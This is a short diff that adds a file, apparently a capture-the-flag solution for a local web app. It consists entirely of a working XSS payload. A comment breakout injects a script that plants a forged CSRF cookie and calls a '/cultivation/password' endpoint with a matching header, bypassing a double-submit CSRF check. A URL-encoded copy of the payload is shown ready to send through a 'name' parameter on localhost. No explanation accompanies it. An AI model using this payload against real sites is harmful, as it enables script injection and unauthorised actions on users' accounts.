@@ -1,0 +1,8 @@
+<!----><script>
+  document.cookie="csrf_token=123; path=/cultivation/password";
+  fetch("/cultivation/password", {
+    headers: {"x-csrf-token": "123"}
+  });
+</script>
+
+<!-- http://localhost:3000/immortal-gate/check?name=%3C!----%3E%3Cscript%3E%20document.cookie=%22csrf_token=123;%20path=/cultivation/password%22;%20fetch(%22/cultivation/password%22,%20{%20headers:%20{%22x-csrf-token%22:%20%22123%22}%20});%20%3C/script%3E -->
